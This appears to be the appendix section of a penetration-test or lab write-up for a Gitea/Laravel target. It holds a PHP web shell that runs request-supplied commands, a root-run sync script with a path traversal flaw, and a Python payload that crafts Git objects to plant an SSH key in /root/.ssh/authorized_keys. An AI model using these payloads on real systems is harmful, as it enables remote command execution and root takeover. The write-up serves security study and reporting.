For reproducibility, the exploit can be obtained from:

https://www.exploit-db.com/exploits/52629

---
## 📚Appendix B — Web Shell Used During Exploitation

### wshell.php

>The following PHP web shell was uploaded to validate arbitrary command execution through the vulnerable TinyMCE upload functionality.

```php
<?php 
system($_REQUEST['cmd']); 
?>
```

---
## 📚Appendix C — Root-Executed Synchronization Script

### template-sync.py

>The following script was recovered from the target system and was executed by the `gitea-template-sync.service` systemd service with root privileges. The vulnerable path-handling logic associated with the **Gitea Template Path Traversal** issue described in **LPE-001** is contained in this script.

```python
import os  
import sys  
import json  
import subprocess  
import time  
import urllib.request  
  
GITEA_URL = "http://localhost:3000"  
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"  
STAGING_DIR = "/home/git/template-staging"  
LOG_FILE = "/var/log/template-sync.log"  
  
def log(msg):  
    ts = time.strftime("%Y-%m-%d %H:%M:%S")  
    line = "[%s] %s" % (ts, msg)  
    print(line, flush=True)  
    try:  
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)  
        with open(LOG_FILE, 'a') as f:  
            f.write(line + '\n')  
    except:  
        pass  
  
def load_config():  
    config = {}  
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:  
        try:  
            with open(path) as f:  
                for line in f:  
                    line = line.strip()  
                    if line and not line.startswith('#') and '=' in line:  
                        k, v = line.split('=', 1)  
                        config[k.strip()] = v.strip()  
        except:  
            pass  
    return config  
  
def get_token():  
    cfg = load_config()  
    return cfg.get('GITEA_API_TOKEN')  
  
def get_template_repos(token):  
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL  
    req = urllib.request.Request(url, headers={  
        'Authorization': 'token %s' % token  
    })  
    try:  
        with urllib.request.urlopen(req) as resp:  
            data = json.loads(resp.read())  
            repos = data.get('data', data) if isinstance(data, dict) else data  
            return [r for r in repos if r.get('template', False)]  
    except Exception as e:  
        log("API error: %s" % e)  
        return []  
  
def sync_template(repo_info):  
    owner = repo_info['owner']['login']  
    name = repo_info['name'].lower()  
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)  
    stage_path = os.path.join(STAGING_DIR, owner, name)  
  
    if not os.path.isdir(bare_path):  
        log("  repo not found: %s" % bare_path)  
        return  
  
    # Read tree entries from the bare repository  
    try:  
        GIT = ['git', '-c', 'safe.directory=*']  
        result = subprocess.run(  
            GIT + ['ls-tree', '-r', 'HEAD'],  
            cwd=bare_path,  
            capture_output=True, text=True, timeout=10  
        )  
        if result.returncode != 0:  
            log("  ls-tree failed: %s" % result.stderr.strip())  
            return  
    except Exception as e:  
        log("  ls-tree error: %s" % e)  
        return  
  
    entries = []  
    for line in result.stdout.strip().split('\n'):  
        if not line:  
            continue  
        parts = line.split('\t', 1)  
        if len(parts) != 2:  
            continue  
        meta, filepath = parts  
        mode, objtype, objhash = meta.split()  
        if objtype == 'blob':  
            entries.append((mode, objhash, filepath))  
  
    if not entries:  
        log("  no files in template")  
        return  
  
    # Extract files to staging directory  
    for mode, objhash, filepath in entries:  
        target = os.path.join(stage_path, filepath)  
        target_dir = os.path.dirname(target)  
  
        try:  
            os.makedirs(target_dir, exist_ok=True)  
            GIT = ['git', '-c', 'safe.directory=*']  
            cat_result = subprocess.run(  
                GIT + ['cat-file', 'blob', objhash],  
                cwd=bare_path,  
                capture_output=True, timeout=10  
            )  
            if cat_result.returncode != 0:  
                continue  
  
            with open(target, 'wb') as f:  
                f.write(cat_result.stdout)  
  
            if mode == '100755':  
                os.chmod(target, 0o755)  
            else:  
                os.chmod(target, 0o644)  
  
            log("  synced: %s" % filepath)  
        except Exception as e:  
            log("  error syncing %s: %s" % (filepath, e))  
  
def main():  
    log("Template sync starting")  
  
    token = get_token()  
    if not token:  
        log("No API token found")  
        sys.exit(1)  
  
    templates = get_template_repos(token)  
    log("Found %d template repo(s)" % len(templates))  
  
    for repo in templates:  
        name = repo['full_name']  
        log("Syncing template: %s" % name)  
        sync_template(repo)  
  
    log("Template sync complete")  
  
if __name__ == '__main__':  
    main()
```
---

## 📚 Appendix D — Malicious Git Object Generation Payload

### PayloadPrivs.py

>The following custom Python payload was used to generate malicious Git tree and commit objects containing directory traversal entries. The payload bypassed Git path validation and enabled arbitrary file write through the vulnerable synchronization service associated with the **Gitea Template Path Traversal** issue described in **LPE-001**

```python
#!/usr/bin/env python3  

import hashlib, zlib, os, subprocess, sys, time  

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha  

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)  

if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)  

r = subprocess.run(["cat", "/tmp/key.pub"], capture_output=True, text=True)
if r.returncode != 0:
    print("ssh-keygen -f /tmp/key -N ''")
    sys.exit(1)

key = r.stdout.strip() + "\n"  

blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir = write_obj(entry("40000", "root", cur), "tree")

for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
ts = int(time.time())
c = "tree %s\nauthor x x@x %d +0000\ncommitter x x@x %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")

print("Done: " + sha)

```


---
# 📊 Findings Summary

| ID      | Severity    | Vulnerability                                        | Status    |
| :------ | :---------- | :--------------------------------------------------- | :-------- |
| WEB-001 | 🟣 CRITICAL | Authenticated Remote Code Execution (CVE-2026-38526) | Confirmed |
| LPE-001 | 🟣 CRITICAL | Root-Executed Gitea Template Path Traversal          | Confirmed |
| WEB-002 | 🔴 HIGH     | Inclusion of Sensitive Information in Source Code    | Confirmed |
| LPE-002 | 🔴 HIGH     | Credential Reuse from Application .env File          | Confirmed |
| WEB-003 | 🟠 MEDIUM   | Laravel Debug Mode Enabled in Production             | Confirmed |

---


# 🧠 Methodology Summary


<p align="center">
  <img src="assets/Attacker%20Recon%20to%20Privilege-2026-08-16-180711.png" alt="Attacker Recon" width="250">
</p>